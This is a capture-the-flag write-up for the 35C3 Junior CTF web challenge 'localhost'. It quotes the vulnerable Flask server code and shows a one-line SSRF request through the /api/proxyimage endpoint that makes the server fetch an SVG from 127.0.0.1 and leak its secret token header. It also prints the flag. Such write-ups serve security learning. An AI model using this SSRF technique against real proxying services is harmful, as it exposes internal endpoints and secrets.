# 35C3 Junior CTF – localhost

* **Category:** Web  
* **Points:** 81 (variable)

## Challenge

> We came up with some ingenious solutions to the problem of password reuse.
> For users, we don't use password auth but send around mails instead. This
> works well for humans but not for robots. To make test automation possible,
> we didn't want to send those mails all the time, so instead we introduced
> the localhost header. If we send a request to our server from the same host,
> our state-of-the-art python server sets the localhost header to a secret
> only known to the server. This is bullet-proof, luckily.  
>  
> http://35.207.189.79/  
>  
> Difficulty Estimate: Medium  
>  
> ===============================================  
>  
> Good coders should learn one new language every year.  
>  
> InfoSec folks are even used to learn one new language for every new problem
> they face (YMMV).  
>  
> If you have not picked up a new challenge in 2018, you're in for a treat.  
>  
> We took the new and upcoming Wee programming language from paperbots.io. Big
> shout-out to Mario Zechner (@badlogicgames) at this point.  
>  
> Some cool Projects can be created in Wee, like: this, this and that.  
>  
> Since we already know Java, though, we ported the server (Server.java and
> Paperbots.java) to Python (WIP) and constantly add awesome functionality.
> Get the new open-sourced server at /pyserver/server.py.  
>  
> Anything unrelated to the new server is left unchanged from commit
> dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github
> (mirrored up to this commit here).  
>  
> We even added new features to this better server, like server-side Wee
> evaluation!  
>  
> To make server-side Wee the language of the future, we already implemented
> awesome runtime functions. To make sure our VM is 100% safe and secure,
> there are also assertion functions in server-side Wee that you don't have to
> be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods
can be discovered.

The header is set in the following method.

```Python  
@app.after_request  
def secure(response: Response):  
   if not request.path[-3:] in ["jpg", "png", "gif"]:  
       response.headers["X-Frame-Options"] = "SAMEORIGIN"  
       response.headers["X-Xss-Protection"] = "1; mode=block"  
       response.headers["X-Content-Type-Options"] = "nosniff"  
       response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"  
       response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"  
       response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; " \  
                                            "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \  
                                            "fullscreen *; payment 'self'; "  
       if request.remote_addr == "127.0.0.1":  
           response.headers["X-Localhost-Token"] = LOCALHOST

   return response  
```

The functionality that can be abused to generate a request from the same
server is the following.

```Python  
# Proxy images to avoid tainted canvases when thumbnailing.  
@app.route("/api/proxyimage", methods=["GET"])  
def proxyimage():  
   url = request.args.get("url", '')  
   parsed = parse.urlparse(url, "http")  # type: parse.ParseResult  
   if not parsed.netloc:  
       parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult  
   url = parsed.geturl()

   resp = requests.get(url)  
   if not resp.headers["Content-Type"].startswith("image/"):  
       raise Exception("Not a valid image")

   # See https://stackoverflow.com/a/36601467/1345238  
   excluded_headers = ['content-encoding', 'content-length', 'transfer-
encoding', 'connection']  
   headers = [(name, value) for (name, value) in resp.raw.headers.items()  
              if name.lower() not in excluded_headers]

   response = Response(resp.content, resp.status_code, headers)  
   return response  
```

This is the functionality used by the `loadImage` method in the programming
environment.

The server runs at what defined here:

```Python  
if __name__ == "__main__":  
   app.run(host="0.0.0.0", port=8075)  
```

An image is mandatory to abuse the service, because the Content-Type is
strictly checked, but three extensions are blacklisted in the code that sets
the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using
`0.0.0.0` for the IP address).

```  
http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg  
```  
  
The response will contain the flag.

```  
X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST  
```

Original writeup (https://github.com/m3ssap0/CTF-
Writeups/blob/master/35C3%20Junior%20CTF/localhost/README.md).